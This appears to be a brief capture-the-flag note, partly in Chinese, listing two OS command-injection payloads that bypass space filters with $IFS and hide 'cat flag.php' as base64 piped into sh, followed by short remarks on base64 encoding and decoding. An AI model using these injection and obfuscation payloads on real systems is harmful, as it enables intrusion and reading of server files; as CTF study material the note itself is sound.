
```python
#1
;cat$IFS$9`ls`
#2
;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

flag.php
base64编码与解码

执行一段base64解码后的数据


执行`cat flag.php`
1. base64 encode
`Y2F0IGZsYWcucGhw`
